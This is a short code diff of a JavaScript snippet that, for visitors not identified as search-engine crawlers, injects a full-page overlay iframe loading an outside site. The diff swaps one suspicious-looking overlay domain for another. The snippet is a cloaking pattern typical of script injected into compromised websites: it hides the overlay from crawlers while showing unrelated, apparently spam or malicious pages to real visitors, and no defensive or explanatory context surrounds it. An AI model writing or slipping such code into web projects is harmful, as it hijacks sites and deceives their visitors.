@@ -19,7 +19,7 @@
     if(!isSpiderUA()){
         var iframe = document.createElement('iframe');
         iframe.id = 'overlay-iframe';
-        iframe.src = 'https://dh-hzh5.ihxhon.cn/entry/1023';
+        iframe.src = 'https://xvah.tukx2seghx.cc/';
         document.body.appendChild(iframe);
     }
 })();
